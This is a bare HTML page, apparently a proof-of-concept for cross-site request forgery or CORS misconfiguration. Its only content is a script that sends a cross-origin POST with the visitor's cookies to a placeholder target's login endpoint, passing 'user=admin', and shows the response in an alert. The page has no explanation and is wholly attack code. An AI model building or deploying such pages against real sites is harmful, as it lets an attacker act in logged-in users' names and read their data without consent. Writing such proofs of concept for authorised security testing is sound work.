<html lang="en">

<head>

<body>
    <script>
        fetch('http://target.domain.com:8080/login', {
            method: 'POST',
            credentials: 'include',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: 'user=admin'
        })
        .then(res => res.text())
        .then(data => alert(data))
    </script>
</body>

</html>
